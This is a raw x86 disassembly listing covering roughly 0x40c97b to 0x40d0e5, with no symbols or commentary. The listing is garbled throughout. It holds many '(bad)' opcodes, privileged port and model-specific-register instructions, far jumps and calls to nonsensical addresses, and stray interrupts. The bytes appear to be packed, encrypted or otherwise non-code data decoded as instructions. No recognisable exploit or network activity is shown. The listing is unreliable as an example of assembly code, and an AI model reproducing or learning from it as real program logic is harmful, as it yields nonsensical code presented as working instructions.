  40c97b:	add    al,0xd2
  40c97d:	das    
  40c97e:	push   esp
  40c97f:	iret   
  40c980:	sbb    ebx,DWORD PTR [ebx]
  40c982:	repnz aaa 
  40c984:	shr    bl,1
  40c986:	in     eax,dx
  40c987:	loope  0x40c9b6
  40c989:	pop    esi
  40c98a:	add    eax,0x7a47375a
  40c98f:	mov    fs,ebx
  40c991:	pop    esp
  40c992:	in     al,0xda
  40c994:	jnp    0x40c9de
  40c996:	xchg   edi,eax
  40c997:	mov    eax,0x781c68ad
  40c99c:	das    
  40c99d:	adc    DWORD PTR [esi+ebp*8-0x71],edx
  40c9a1:	imul   esi,DWORD PTR [ebx-0x72],0xe3c9ec01
  40c9a8:	lahf   
  40c9a9:	scas   al,BYTE PTR es:[edi]
  40c9aa:	out    dx,eax
  40c9ab:	in     eax,dx
  40c9ac:	mov    eax,0xd8d0859e
  40c9b1:	inc    sp
  40c9b3:	push   ds
  40c9b4:	aad    0x91
  40c9b6:	ins    DWORD PTR es:[edi],dx
  40c9b7:	bound  edx,QWORD PTR [ecx+0x15]
  40c9ba:	(bad)  [eax+0x63]
  40c9bd:	mov    eax,0xb4c25ac5
  40c9c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9c3:	aad    0xad
  40c9c5:	repnz (bad)
  40c9c8:	pop    eax
  40c9c9:	pop    ebp
  40c9ca:	cmc    
  40c9cb:	es nop edi
  40c9cf:	pop    ebx
  40c9d0:	push   edx
  40c9d1:	jle    0x40ca18
  40c9d3:	pusha  
  40c9d4:	lods   eax,DWORD PTR ds:[esi]
  40c9d5:	in     eax,dx
  40c9d6:	ret    0x98eb
  40c9d9:	sbb    BYTE PTR [esi+edi*4-0x46c2d06f],al
  40c9e0:	add    eax,0x6d8ec717
  40c9e5:	test   BYTE PTR [ebx],ah
  40c9e7:	pop    DWORD PTR [edi-0x41037ba8]
  40c9ed:	xchg   edx,eax
  40c9ee:	jbe    0x40c9b0
  40c9f0:	push   eax
  40c9f1:	lods   eax,DWORD PTR ds:[esi]
  40c9f2:	bound  ecx,QWORD PTR [esi+0x30746e81]
  40c9f8:	int    0x9c
  40c9fa:	(bad)  
  40c9fb:	shr    DWORD PTR [eax+ebx*2+0x10d75e8],1
  40ca02:	outs   dx,DWORD PTR ds:[esi]
  40ca03:	push   cs
  40ca04:	addr16 mov edi,0x100521f1
  40ca0a:	cmp    eax,0xfdc98a35
  40ca0f:	js     0x40ca8c
  40ca11:	sbb    BYTE PTR [esi],bh
  40ca13:	cmc    
  40ca14:	pop    edi
  40ca15:	or     al,0x88
  40ca17:	sbb    eax,0x254cdd57
  40ca1c:	jo     0x40c9c4
  40ca1e:	shr    BYTE PTR [ebp+0x4fbe11c8],0x96
  40ca25:	in     al,dx
  40ca26:	in     eax,0x72
  40ca28:	mov    cs,WORD PTR [ebx-0x7c]
  40ca2b:	or     BYTE PTR [ebx+0x7a4bef01],dl
  40ca31:	out    0xc4,eax
  40ca33:	mov    ds,WORD PTR [ebx]
  40ca35:	lods   al,BYTE PTR ds:[esi]
  40ca36:	adc    ecx,0xffffffca
  40ca39:	lds    esi,FWORD PTR ds:0xd67a6aab
  40ca3f:	dec    eax
  40ca40:	rol    BYTE PTR [eax-0x583f91f8],cl
  40ca46:	jae    0x40cac4
  40ca48:	mov    ds,WORD PTR [esi]
  40ca4a:	push   edi
  40ca4b:	inc    eax
  40ca4c:	xor    BYTE PTR [esi+eiz*4-0x11],0xcb
  40ca51:	stc    
  40ca52:	add    cl,BYTE PTR [esi+0xfd313ea]
  40ca58:	lds    ebx,FWORD PTR [edi]
  40ca5a:	pop    es
  40ca5b:	mov    dl,0x16
  40ca5d:	mov    bh,0xb9
  40ca5f:	mov    ?,WORD PTR [ecx]
  40ca61:	mov    WORD PTR [eax-0x7a7c1c79],ss
  40ca67:	dec    ebp
  40ca68:	aas    
  40ca69:	and    ah,cl
  40ca6b:	or     ah,BYTE PTR [edx-0x1071a88a]
  40ca71:	outs   dx,DWORD PTR ds:[esi]
  40ca72:	cli    
  40ca73:	or     edi,esi
  40ca75:	add    eax,0x872be43f
  40ca7a:	imul   DWORD PTR [esi+0x3c]
  40ca7d:	in     eax,0x85
  40ca7f:	push   edi
  40ca80:	or     cl,BYTE PTR [ebp+0x1e734cc0]
  40ca86:	fwait
  40ca87:	ins    DWORD PTR es:[edi],dx
  40ca88:	cli    
  40ca89:	add    eax,0xcacee3e8
  40ca8e:	xchg   edx,eax
  40ca8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca90:	clc    
  40ca91:	xchg   DWORD PTR [ebp-0x52],ebp
  40ca94:	push   edx
  40ca95:	jmp    0x52abb37f
  40ca9a:	jae    0x40ca2f
  40ca9c:	sbb    DWORD PTR [ebx+0x24],edx
  40ca9f:	out    0x14,eax
  40caa1:	shl    BYTE PTR [ebp-0x7b041764],0xa4
  40caa8:	lea    edi,[eax+0x7ed28a7c]
  40caae:	pop    ebx
  40caaf:	(bad)  
  40cab0:	push   ebx
  40cab1:	(bad)  
  40cab2:	into   
  40cab3:	das    
  40cab4:	shl    BYTE PTR [edx],1
  40cab6:	lds    edx,FWORD PTR [ebx]
  40cab8:	xor    bh,ch
  40caba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cabb:	call   DWORD PTR [edi]
  40cabd:	mov    BYTE PTR [ebp+0x76dc5536],0x3d
  40cac4:	outs   dx,BYTE PTR ds:[esi]
  40cac5:	mov    ebx,0x2c018df5
  40caca:	mov    WORD PTR ds:0x9ee3a6e2,ss
  40cad0:	fild   WORD PTR [ecx-0x9c1007b]
  40cad6:	mov    al,0xeb
  40cad9:	dec    ebp
  40cada:	pop    es
  40cadb:	mov    ss,WORD PTR [esp+eax*2+0x59b00470]
  40cae2:	xchg   BYTE PTR [edx-0x2e],dl
  40cae5:	sbb    eax,edi
  40cae7:	jns    0x40cb62
  40cae9:	in     al,dx
  40caea:	div    ch
  40caec:	sub    al,0x1e
  40caee:	xor    BYTE PTR [ebx+0x6e88566a],ah
  40caf4:	push   esi
  40caf5:	add    al,BYTE PTR [ebp+0x35b2fa12]
  40cafb:	clc    
  40cafc:	retfw  
  40cafe:	add    edx,DWORD PTR [ebp+0x108a5c3e]
  40cb04:	shl    BYTE PTR [ebp+0x3b68cbd9],cl
  40cb0a:	test   cl,bl
  40cb0c:	mov    eax,0x4234d4b2
  40cb11:	and    BYTE PTR [eax],0x45
  40cb14:	lahf   
  40cb15:	add    al,0x83
  40cb17:	(bad)  [ecx+edx*8]
  40cb1a:	xchg   edi,eax
  40cb1b:	jo     0x40cae4
  40cb1d:	or     ebp,ebx
  40cb1f:	jbe    0x40cb02
  40cb21:	fincstp 
  40cb23:	push   cs
  40cb24:	fdivr  QWORD PTR [ebp*2+0xb76c83e]
  40cb2b:	mov    gs,WORD PTR [edi+0x1ddac544]
  40cb31:	in     eax,0x73
  40cb33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb34:	ror    BYTE PTR [ecx+0x68c3350d],cl
  40cb3a:	dec    esp
  40cb3b:	cdq    
  40cb3c:	inc    edx
  40cb3d:	push   ds
  40cb3e:	add    ch,BYTE PTR [eax+ecx*4-0x56]
  40cb42:	inc    esp
  40cb43:	ret    
  40cb44:	loopne 0x40cb20
  40cb46:	test   DWORD PTR [edx+0x75],edi
  40cb49:	ret    
  40cb4a:	aam    0x22
  40cb4c:	dec    edi
  40cb4d:	cmp    eax,0x1e41e45a
  40cb52:	dec    ebx
  40cb53:	test   BYTE PTR [esi-0x33],ah
  40cb56:	jmp    ebp
  40cb58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb59:	jne    0x7638df34
  40cb5f:	(bad)  
  40cb60:	jecxz  0x40cb27
  40cb62:	mov    BYTE PTR [eax+0x59db6b09],bl
  40cb68:	push   ecx
  40cb69:	and    eax,0x5bc83645
  40cb6e:	inc    esp
  40cb6f:	lods   al,BYTE PTR ds:[esi]
  40cb70:	rcr    DWORD PTR [ebp+0x7ef0e0f4],cl
  40cb76:	xchg   esi,eax
  40cb77:	and    BYTE PTR [edx+0x1d93548d],bl
  40cb7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb7e:	xchg   esi,eax
  40cb7f:	aad    0xd4
  40cb81:	or     DWORD PTR [ebp+0xa],0x25
  40cb85:	popf   
  40cb86:	test   ebp,esp
  40cb88:	ds loopne 0x40cbbb
  40cb8b:	add    DWORD PTR [ebp-0x34],esi
  40cb8e:	popa   
  40cb8f:	mov    cs,WORD PTR [eax]
  40cb91:	shl    esp,1
  40cb93:	mov    ch,0x90
  40cb95:	cmc    
  40cb96:	scas   al,BYTE PTR es:[edi]
  40cb97:	scas   eax,DWORD PTR es:[edi]
  40cb98:	imul   eax,DWORD PTR es:[edi-0x4d14cd7],0x61
  40cba0:	and    bl,BYTE PTR [esi+0x55]
  40cba3:	dec    DWORD PTR [esi+ebx*1-0x75]
  40cba7:	jmp    0x8209:0x9882f19a
  40cbae:	test   DWORD PTR [edi+edx*4+0x21d21653],edx
  40cbb5:	jmp    0x8feb:0xba118352
  40cbbc:	pop    es
  40cbbd:	push   ecx
  40cbbe:	pop    eax
  40cbbf:	dec    esi
  40cbc0:	xor    BYTE PTR [eax-0x5b2d353f],dl
  40cbc6:	mov    eax,0x854d673d
  40cbcb:	std    
  40cbcc:	ins    BYTE PTR es:[edi],dx
  40cbcd:	jmp    0x986a:0x3d8a67d4
  40cbd4:	test   eax,0xd20b6914
  40cbd9:	(bad)  
  40cbda:	retf   
  40cbdb:	test   DWORD PTR [esi-0x196b7b89],0xbb1578ec
  40cbe5:	push   ebx
  40cbe6:	lahf   
  40cbe7:	mov    dh,dh
  40cbe9:	ss xor edi,ebx
  40cbec:	in     eax,dx
  40cbed:	daa    
  40cbee:	and    eax,0xaece6f20
  40cbf3:	out    dx,eax
  40cbf4:	rcl    BYTE PTR [ebx+ebp*2-0x5e],cl
  40cbf8:	cdq    
  40cbf9:	and    eax,0x22b4421e
  40cbfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbff:	ins    BYTE PTR es:[edi],dx
  40cc00:	push   ebx
  40cc01:	xchg   esp,eax
  40cc02:	inc    edx
  40cc03:	cs aaa 
  40cc05:	les    edx,FWORD PTR [ebp*4+0x1dfb4115]
  40cc0c:	scas   eax,DWORD PTR es:[edi]
  40cc0d:	jp     0x40cc36
  40cc0f:	pop    ebp
  40cc10:	sbb    eax,0x9eae08d3
  40cc15:	inc    ecx
  40cc16:	(bad)  
  40cc17:	pop    esi
  40cc18:	push   ecx
  40cc19:	push   ds
  40cc1a:	xchg   esi,eax
  40cc1b:	push   esp
  40cc1c:	pop    edi
  40cc1d:	mov    edx,0x48bdb7a2
  40cc22:	test   BYTE PTR [eax],bl
  40cc24:	inc    ecx
  40cc25:	jmp    0xcb92d717
  40cc2a:	dec    eax
  40cc2b:	mov    ?,WORD PTR [edi+eax*2+0x5d]
  40cc2f:	jmp    0x5c612bf3
  40cc34:	jmp    0x40cc18
  40cc36:	lea    ecx,[esi-0x3d9fe9c8]
  40cc3c:	pop    es
  40cc3d:	wrmsr  
  40cc3f:	lea    esi,[eax+0x745bc7e1]
  40cc45:	js     0x40ccaf
  40cc47:	js     0x40cc1c
  40cc49:	pop    esp
  40cc4a:	ss push 0x3a
  40cc4d:	int    0xc9
  40cc4f:	mov    esi,0x8ed6afa2
  40cc54:	add    al,0xd9
  40cc56:	sbb    esi,DWORD PTR [edi]
  40cc58:	cmp    DWORD PTR [ebx],eax
  40cc5a:	lock inc ebp
  40cc5c:	rcl    DWORD PTR [ebx],0xe3
  40cc5f:	cmp    eax,0x4aa34ed3
  40cc64:	fucomip st,st(5)
  40cc66:	(bad)
  40cc69:	pop    ss
  40cc6a:	mov    DWORD PTR [esi+0x63d7367d],ecx
  40cc70:	mov    dl,0xc7
  40cc72:	inc    edx
  40cc73:	adc    edx,0x5a
  40cc76:	fcom   DWORD PTR [edi]
  40cc78:	(bad)  
  40cc79:	out    0x1e,al
  40cc7b:	xor    DWORD PTR [esi],ebx
  40cc7d:	adc    DWORD PTR [ecx-0x2ead1e7],edx
  40cc83:	aam    0x1d
  40cc85:	fiadd  DWORD PTR [ebp-0x32726158]
  40cc8b:	je     0x40cc16
  40cc8d:	mov    bh,0x9d
  40cc8f:	stos   DWORD PTR es:[edi],eax
  40cc90:	mov    bh,0xa7
  40cc92:	test   DWORD PTR [ebx],esi
  40cc94:	or     DWORD PTR [edx+ecx*8+0x6d2edf16],ebp
  40cc9b:	push   0xffffffe6
  40cc9d:	dec    BYTE PTR [eax+0x78033e8e]
  40cca3:	fcomp  QWORD PTR [edx+ebp*8+0x670961da]
  40ccaa:	jge    0x40ccd5
  40ccac:	in     eax,dx
  40ccad:	push   cs
  40ccae:	lods   eax,DWORD PTR ds:[esi]
  40ccaf:	push   edx
  40ccb0:	adc    BYTE PTR [ebx-0x71],0x95
  40ccb4:	and    bl,BYTE PTR [eax+ecx*4+0x7533f05d]
  40ccbb:	push   eax
  40ccbc:	retf   
  40ccbd:	cmc    
  40ccbe:	addr16 mov ds,ecx
  40ccc1:	and    cl,BYTE PTR [edi-0x35]
  40ccc4:	mov    ah,0x1d
  40ccc6:	and    edi,DWORD PTR [ebp-0x2e]
  40ccc9:	xchg   ebp,eax
  40ccca:	xor    ebp,DWORD PTR [eax+0x32]
  40cccd:	imul   edi,ecx,0xffffffbc
  40ccd0:	repnz push ds
  40ccd2:	retf   0x5851
  40ccd5:	or     DWORD PTR fs:[ecx-0x5cc98a07],esp
  40ccdc:	and    bh,BYTE PTR [esi+edx*8]
  40ccdf:	add    cl,0xe6
  40cce2:	jns    0x40cca4
  40cce4:	ror    BYTE PTR [esi-0x20],cl
  40cce7:	int3   
  40cce8:	mov    ch,0x7b
  40ccea:	je     0x40cc7f
  40ccec:	mov    ecx,0xcd261ac1
  40ccf1:	outs   dx,BYTE PTR ds:[esi]
  40ccf2:	and    al,0xf9
  40ccf4:	cmp    edx,DWORD PTR [edx]
  40ccf6:	or     eax,0x8fdda448
  40ccfb:	push   edi
  40ccfc:	or     eax,0x75c6551c
  40cd01:	test   DWORD PTR [ebp-0x6b],edx
  40cd04:	cmp    BYTE PTR [ebp+0x7b728ef8],0x5a
  40cd0b:	or     DWORD PTR [eax],edx
  40cd0d:	xchg   esi,eax
  40cd0e:	xlat   BYTE PTR ds:[ebx]
  40cd0f:	std    
  40cd10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd11:	sbb    edi,edi
  40cd13:	push   ss
  40cd14:	mov    DWORD PTR [esi+0x7e],0x50c8b8ce
  40cd1b:	shr    DWORD PTR [esi+ebx*1],cl
  40cd1e:	mov    bl,0x85
  40cd20:	mov    al,0x9
  40cd22:	mov    eax,ds:0x852ee0c9
  40cd27:	xchg   ebx,eax
  40cd28:	shl    BYTE PTR [edx+edi*4],1
  40cd2b:	lods   al,BYTE PTR ds:[esi]
  40cd2c:	jmp    0xd7e99186
  40cd31:	jmp    0x3e2:0x8afc605
  40cd38:	or     eax,0xce2f85f1
  40cd3d:	leave  
  40cd3e:	in     eax,dx
  40cd3f:	mov    bh,ah
  40cd41:	or     al,0x46
  40cd43:	lahf   
  40cd44:	fbld   TBYTE PTR [ebx-0x2]
  40cd47:	jbe    0x40cdb2
  40cd49:	sbb    DWORD PTR [eax+0x5e],ebp
  40cd4c:	pop    edx
  40cd4d:	mov    DWORD PTR [esi],ecx
  40cd4f:	(bad)  
  40cd51:	jmp    0x9823:0xf274673
  40cd58:	iret   
  40cd59:	adc    DWORD PTR [ebx+0x7e],ebx
  40cd5c:	add    al,0x59
  40cd5e:	xchg   ebx,eax
  40cd5f:	mov    al,ds:0xc885ec8e
  40cd64:	loop   0x40cdb2
  40cd66:	inc    edi
  40cd67:	fsincos 
  40cd69:	inc    ebp
  40cd6a:	fsubr  QWORD PTR [ebx+0x4c84b4a1]
  40cd70:	comiss xmm4,DWORD PTR [ebx]
  40cd73:	inc    BYTE PTR [ecx-0x7c]
  40cd76:	int3   
  40cd77:	int    0xeb
  40cd79:	or     DWORD PTR [ebx+0x63],0xcbdf7bd1
  40cd80:	(bad)  
  40cd82:	sbb    DWORD PTR [ebp+0x39],edi
  40cd85:	arpl   WORD PTR [edx-0x1ad6e572],bx
  40cd8b:	mov    edi,0xa23d49eb
  40cd90:	shl    BYTE PTR [esi-0x62],cl
  40cd93:	pop    esi
  40cd94:	bound  ebp,QWORD PTR [eax+0x11104a09]
  40cd9a:	int    0x17
  40cd9c:	lds    esp,FWORD PTR [ebp+0x39]
  40cd9f:	and    edi,DWORD PTR [ecx+0x38]
  40cda2:	mov    esp,DWORD PTR [ebp-0xf241727]
  40cda8:	pop    ebx
  40cda9:	fidiv  WORD PTR [edi+0x1240293]
  40cdaf:	call   0xe1e6:0xd32c85d2
  40cdb6:	sub    bh,BYTE PTR [edx+edx*8-0x78a61451]
  40cdbd:	jns    0x40cd52
  40cdbf:	cld    
  40cdc0:	push   edx
  40cdc1:	adc    ecx,edi
  40cdc3:	scas   eax,DWORD PTR es:[edi]
  40cdc4:	pop    eax
  40cdc5:	inc    esp
  40cdc6:	inc    ebx
  40cdc7:	lea    esp,[edx-0x493f473e]
  40cdcd:	pop    eax
  40cdce:	push   edx
  40cdcf:	fild   QWORD PTR [ebp-0x113a54b2]
  40cdd5:	mov    ds:0x36b31e02,eax
  40cdda:	dec    ebp
  40cddb:	clc    
  40cddc:	adc    eax,0xbca35c1e
  40cde1:	xchg   ebx,eax
  40cde2:	inc    edi
  40cde3:	imul   esp,DWORD PTR [esi+0x25],0x1e5f79ff
  40cdea:	es pop ss
  40cdec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cded:	xchg   dl,al
  40cdef:	mov    gs,esp
  40cdf1:	cmp    ch,BYTE PTR [ebp-0x606598a5]
  40cdf7:	aaa    
  40cdf8:	shl    BYTE PTR [eax-0x39f53a82],cl
  40cdfe:	and    BYTE PTR [edi],0xbe
  40ce01:	adc    ecx,eax
  40ce03:	repnz cdq 
  40ce05:	aad    0x6a
  40ce07:	loope  0x40cdd7
  40ce09:	push   edi
  40ce0a:	test   BYTE PTR [ebp-0x6d7c2738],al
  40ce10:	lock repz add edx,DWORD PTR [ebx-0x3d387305]
  40ce18:	jne    0x40ce4a
  40ce1a:	ins    DWORD PTR es:[edi],dx
  40ce1b:	cmp    DWORD PTR [ecx+esi*2-0x7f],ecx
  40ce1f:	xchg   ebp,eax
  40ce20:	xchg   edx,eax
  40ce21:	cli    
  40ce22:	loop   0x40ce11
  40ce24:	rol    BYTE PTR [edi+0x5c80262a],cl
  40ce2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce2b:	mov    gs,WORD PTR [ebx+0x3686fe38]
  40ce31:	je     0x40cdc0
  40ce33:	out    dx,eax
  40ce34:	rcr    BYTE PTR [edx],cl
  40ce36:	aaa    
  40ce37:	xor    eax,0xcab1a9d9
  40ce3c:	retf   
  40ce3d:	popa   
  40ce3e:	mov    dl,0x8e
  40ce40:	scas   al,BYTE PTR es:[edi]
  40ce41:	rcr    DWORD PTR [ecx],cl
  40ce43:	push   esi
  40ce44:	cmp    dl,ah
  40ce46:	push   es
  40ce47:	int    0xd5
  40ce49:	and    DWORD PTR [esi-0x71e18aea],0x19
  40ce50:	xor    ah,BYTE PTR [ecx]
  40ce52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce53:	scas   eax,DWORD PTR es:[edi]
  40ce54:	popa   
  40ce55:	ja     0x40ce5b
  40ce57:	jne    0x40cea6
  40ce59:	outs   dx,BYTE PTR ds:[esi]
  40ce5a:	jmp    0x40ce06
  40ce5c:	push   es
  40ce5d:	sub    ebp,esi
  40ce5f:	out    dx,eax
  40ce60:	pop    esi
  40ce61:	inc    esi
  40ce62:	inc    esp
  40ce63:	dec    esi
  40ce64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce65:	jecxz  0x40cdfb
  40ce67:	repnz adc BYTE PTR [ecx],0x20
  40ce6b:	mov    esp,0x2a1486ef
  40ce70:	cmc    
  40ce71:	mov    ecx,0xd435d85
  40ce76:	jle    0x40cec1
  40ce78:	in     al,0x76
  40ce7a:	sbb    DWORD PTR [esi-0x6cb2e7b2],ecx
  40ce80:	aaa    
  40ce81:	xor    dh,ch
  40ce83:	mov    esi,0xe5c942d2
  40ce88:	ss pop ds
  40ce8a:	enter  0x2178,0x11
  40ce8e:	mov    al,ds:0xc0762e8c
  40ce93:	inc    edx
  40ce94:	cmp    ch,BYTE PTR [esi-0x7482f87b]
  40ce9a:	shl    DWORD PTR [edi-0x68b0e565],1
  40cea0:	mov    ds:0x4111b24b,eax
  40cea5:	push   ds
  40cea6:	add    dh,BYTE PTR gs:[edi]
  40cea9:	and    al,BYTE PTR [ebp+0x5334792a]
  40ceaf:	pop    edi
  40ceb0:	xchg   BYTE PTR ds:0x294097af,dh
  40ceb6:	rcr    ch,0x8e
  40ceb9:	xchg   ebp,eax
  40cebb:	cmp    BYTE PTR [edx-0x14],cl
  40cebe:	clc    
  40cebf:	je     0x40ce93
  40cec1:	loopne 0x40cf39
  40cec3:	sub    al,0x43
  40cec5:	js     0x40ce69
  40cec7:	push   ecx
  40cec8:	xchg   edx,eax
  40cec9:	adc    ebp,esp
  40cecb:	push   0x3b
  40cecd:	pop    ebp
  40cece:	mov    dh,0xc6
  40ced0:	or     al,0x49
  40ced2:	test   BYTE PTR [esi+eiz*8-0x56],dh
  40ced6:	jnp    0x40cecf
  40ced8:	call   0xa2cf377f
  40cedd:	push   es
  40cede:	cmp    al,0xff
  40cee0:	add    DWORD PTR [eax+0x74d66df4],ebp
  40cee6:	sbb    al,BYTE PTR [eax+eiz*1]
  40cee9:	cmc    
  40ceea:	push   eax
  40ceeb:	(bad)  
  40ceec:	fmul   QWORD PTR [ecx]
  40ceee:	jne    0x40ce85
  40cef0:	add    BYTE PTR ds:0x66ecdaf7,al
  40cef6:	test   BYTE PTR [edx],ah
  40cef8:	jecxz  0x40cf01
  40cefa:	sub    eax,0x6cb5f419
  40ceff:	xchg   edx,eax
  40cf00:	pop    ecx
  40cf01:	(bad)  
  40cf02:	mov    edi,0x2a9105d0
  40cf07:	jnp    0x40ce8e
  40cf09:	dec    edi
  40cf0a:	test   DWORD PTR [eax+0x1a928657],ebx
  40cf10:	(bad)  
  40cf11:	aad    0x51
  40cf13:	pop    ss
  40cf14:	push   ds
  40cf15:	adc    DWORD PTR [edi],eax
  40cf17:	xchg   ebp,eax
  40cf18:	inc    ebp
  40cf1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf1b:	nop
  40cf1c:	cmp    esi,DWORD PTR [eax*4-0x2b007ba1]
  40cf23:	popf   
  40cf24:	loopne 0x40cf71
  40cf26:	call   0x281d3db9
  40cf2b:	fmul   DWORD PTR [ecx-0x14]
  40cf2e:	dec    ebp
  40cf2f:	jle    0x40cf03
  40cf31:	adc    eax,0x50789382
  40cf36:	sub    BYTE PTR [ecx+0x3ba71105],dh
  40cf3c:	hlt    
  40cf3d:	mov    ecx,0xf5b94e7b
  40cf42:	test   ecx,edx
  40cf44:	stos   BYTE PTR es:[edi],al
  40cf45:	dec    ecx
  40cf46:	xchg   edi,eax
  40cf47:	push   0x985a13f8
  40cf4c:	ins    DWORD PTR es:[edi],dx
  40cf4d:	(bad)  
  40cf4e:	push   esi
  40cf4f:	adc    edx,0x8da66008
  40cf55:	dec    eax
  40cf56:	test   BYTE PTR [eax+0x49f83581],ch
  40cf5c:	mov    al,ds:0x60bf3d5e
  40cf61:	out    dx,al
  40cf62:	ficom  DWORD PTR [edi-0x63892266]
  40cf68:	scas   eax,DWORD PTR es:[edi]
  40cf69:	and    al,0x65
  40cf6b:	push   es
  40cf6c:	mov    bh,0x3f
  40cf6e:	sbb    BYTE PTR [eax-0x719edb89],0xf
  40cf75:	sub    eax,0x1327667b
  40cf7a:	jmp    0x8c9e8c07
  40cf7f:	jae    0x40cfb3
  40cf81:	in     eax,dx
  40cf82:	(bad)  [edx-0x2e]
  40cf85:	sbb    cl,dl
  40cf87:	out    0x7b,eax
  40cf89:	or     DWORD PTR [edi+0x29],ebx
  40cf8c:	add    BYTE PTR [esi],ah
  40cf8e:	xchg   esp,eax
  40cf8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf90:	ror    BYTE PTR [esp+edi*4],cl
  40cf93:	out    dx,al
  40cf94:	jo     0x40cfed
  40cf96:	sar    esp,1
  40cf98:	cmp    al,0x4f
  40cf9a:	call   0x4582ec83
  40cf9f:	sbb    BYTE PTR [ecx+0x32a4f281],dh
  40cfa5:	jbe    0x40cfe7
  40cfa7:	pop    DWORD PTR [esi+edi*2+0x7]
  40cfab:	into   
  40cfac:	ret    0xedfd
  40cfaf:	xchg   ebp,eax
  40cfb0:	mov    esi,0x119a8477
  40cfb5:	and    edi,DWORD PTR [ebx+0x69]
  40cfb8:	jb     0x40cf7f
  40cfba:	int    0x8e
  40cfbc:	jmp    0x40cfac
  40cfbe:	enter  0x3fb7,0xa1
  40cfc2:	shr    DWORD PTR [ebx],cl
  40cfc4:	shl    bh,cl
  40cfc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfc7:	mov    ch,0xa9
  40cfc9:	das    
  40cfca:	push   ss
  40cfcb:	add    BYTE PTR [edx+0x1d],bh
  40cfce:	inc    edi
  40cfcf:	pop    esp
  40cfd0:	int    0x0
  40cfd2:	xor    eax,0x5dd031e2
  40cfd7:	aas    
  40cfd8:	call   0x63c:0xd0d8d531
  40cfdf:	fdiv   QWORD PTR [edx+0x3e]
  40cfe2:	shl    BYTE PTR [edx-0x715c45d5],0x53
  40cfe9:	xor    eax,0x46b010ed
  40cfee:	add    ah,BYTE PTR [edi]
  40cff0:	ror    BYTE PTR [edx+0x30],cl
  40cff3:	out    dx,al
  40cff4:	mov    esp,0x9d8c2f36
  40cff9:	adc    eax,esi
  40cffb:	sbb    eax,0xd6572a55
  40d000:	aam    0xd8
  40d002:	xchg   BYTE PTR [edi+0x57581254],ch
  40d008:	push   edx
  40d009:	nop
  40d00a:	mov    bh,0xc3
  40d00c:	inc    ecx
  40d00d:	push   ds
  40d00e:	and    al,0xa9
  40d010:	gs adc eax,0xffffff86
  40d014:	out    dx,al
  40d015:	and    DWORD PTR [ebp-0x74c6abd],eax
  40d01b:	or     BYTE PTR [edi],0xbb
  40d01e:	push   edi
  40d01f:	outs   dx,DWORD PTR ds:[esi]
  40d020:	adc    al,0x11
  40d022:	push   ebp
  40d023:	jecxz  0x40d096
  40d025:	and    ebx,DWORD PTR [edi]
  40d027:	(bad)  
  40d028:	outs   dx,BYTE PTR ds:[esi]
  40d029:	sbb    al,0x80
  40d02b:	inc    eax
  40d02c:	inc    eax
  40d02d:	push   es
  40d02e:	sbb    eax,0x70e3bd8e
  40d033:	fmul   DWORD PTR [ebx+0x25]
  40d036:	sub    DWORD PTR [esi-0x2e],0xffffffdb
  40d03a:	lds    edx,FWORD PTR [edi]
  40d03c:	pop    ss
  40d03d:	add    ebx,0x4ddad233
  40d043:	cmp    eax,0xcc21375d
  40d048:	inc    ebx
  40d049:	push   ds
  40d04a:	jnp    0x40d0a3
  40d04c:	imul   eax,esi,0xffffffaf
  40d04f:	retf   
  40d050:	add    ch,dh
  40d052:	test   DWORD PTR [eax+0x7e],edx
  40d055:	add    cl,BYTE PTR [esi]
  40d057:	sbb    DWORD PTR [ebp-0x14],0x45a297bd
  40d05e:	out    dx,al
  40d05f:	aaa    
  40d060:	sbb    eax,0xc8ecea7
  40d065:	repnz nop
  40d067:	hlt    
  40d068:	inc    BYTE PTR cs:[ebp-0x2deccb88]
  40d06f:	or     eax,0x8ee67e35
  40d074:	shr    BYTE PTR [esi-0x2ef1b882],0x1
  40d07b:	jg     0x40d04f
  40d07d:	adc    eax,0x48e46a86
  40d082:	xchg   ecx,eax
  40d083:	pop    edi
  40d084:	fwait
  40d085:	adc    DWORD PTR [esp+ecx*2+0x1d8af007],esp
  40d08c:	(bad)  
  40d08d:	jmp    0x727f:0x953cf885
  40d094:	mov    fs,WORD PTR [esi-0x113271b9]
  40d09a:	fs cwde 
  40d09c:	addr16 mov al,0x32
  40d09f:	and    edx,edx
  40d0a1:	aam    0xb4
  40d0a3:	rcr    BYTE PTR [eax+eiz*8+0x11a96a92],cl
  40d0aa:	mov    eax,ds:0x26dd20ab
  40d0af:	sbb    al,ch
  40d0b1:	fsubr  DWORD PTR ds:0x9f10dcba
  40d0b7:	pop    es
  40d0b8:	mov    al,0x56
  40d0ba:	in     eax,dx
  40d0bb:	cs mov bl,0x5f
  40d0be:	dec    ebp
  40d0bf:	push   ds
  40d0c0:	adc    DWORD PTR [ecx],edx
  40d0c2:	adc    dh,BYTE PTR [edx-0x49]
  40d0c5:	iret   
  40d0c6:	cmp    ebx,DWORD PTR [edx]
  40d0c8:	scas   al,BYTE PTR es:[edi]
  40d0c9:	clc    
  40d0ca:	lea    edi,[ecx-0x39]
  40d0cd:	adc    DWORD PTR [ebx],ecx
  40d0cf:	push   esi
  40d0d0:	xchg   ebx,eax
  40d0d1:	dec    edx
  40d0d2:	dec    esp
  40d0d3:	clc    
  40d0d4:	unpcklps xmm6,XMMWORD PTR [esi-0x27]
  40d0d8:	lods   al,BYTE PTR ds:[esi]
  40d0d9:	rol    ebp,0xc5
  40d0dc:	and    ebp,DWORD PTR [edx]
  40d0de:	mov    bl,0xfb
  40d0e0:	lods   al,BYTE PTR ds:[esi]
  40d0e1:	add    al,0xa8
  40d0e3:	jne    0x40d0e2
  40d0e5:	retf   0xd303
